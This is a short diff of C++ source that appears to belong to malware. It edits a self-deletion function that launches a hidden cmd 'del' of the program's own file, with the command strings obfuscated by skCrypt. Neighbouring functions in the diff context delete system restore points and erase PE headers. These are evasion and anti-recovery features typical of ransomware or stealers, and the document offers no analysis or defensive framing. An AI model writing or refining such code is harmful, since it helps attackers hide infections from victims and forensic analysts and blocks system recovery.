@@ -46,7 +46,7 @@ void DeleteRestorePoints() {
 }
 
 void DeleteMe(const string& myPath) {
-    system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
+    system(((string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
 }
 
 void PEHeaderDeleter() {
